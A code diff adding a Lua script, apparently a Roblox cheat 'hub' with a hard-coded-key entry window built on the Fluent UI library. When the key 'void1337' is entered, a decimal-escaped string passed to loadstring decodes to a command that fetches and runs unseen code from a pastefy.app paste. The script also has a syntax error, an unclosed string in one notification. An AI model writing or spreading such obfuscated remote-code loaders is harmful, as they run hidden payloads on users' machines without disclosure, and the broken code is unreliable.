@@ -1,0 +1,53 @@
+local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
+local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
+local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
+
+local Window = Fluent:CreateWindow({
+    Title = "bypassed verification BOBO HUB",
+    SubTitle = "by void123",
+    TabWidth = 160,
+    Size = UDim2.fromOffset(450, 350),
+    Theme = "Darker",
+})
+
+local Tabs = {
+    Main = Window:AddTab({ Title = "Key System", Icon = "key" }),
+}
+
+   local Input = Tabs.Main:AddInput("Input", {
+        Title = "Enter Key",
+        Default = "",
+        Placeholder = "-?-",
+        Callback = function(Value)
+           baik = Value
+        end
+    })
+
+	 Tabs.Main:AddButton({
+        Title = "Enter Keys",
+		Callback = function(w)
+		if baik == "void1337" then
+			Fluent:Notify({
+    Title = "void137",
+    Content = "void1337,
+    Duration = 8
+})
+loadstring("\32\10\32\32\32\32\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\102\121\46\97\112\112\47\112\50\84\109\105\77\88\100\47\114\97\119\34\41\41\40\41\10")()
+		   else
+			 Fluent:Notify({
+    Title = "yay",
+    Content = "wtf",
+    Duration = 8
+})  
+		   end
+		end
+	 })
+
+	 Tabs.Main:AddButton({
+        Title = "Copy link void1337 server",
+		Callback = function(w)
+		setclipboard("https://discord.gg/V3ut4nyh28")
+		end
+	 })
+
+Window:SelectTab(1)
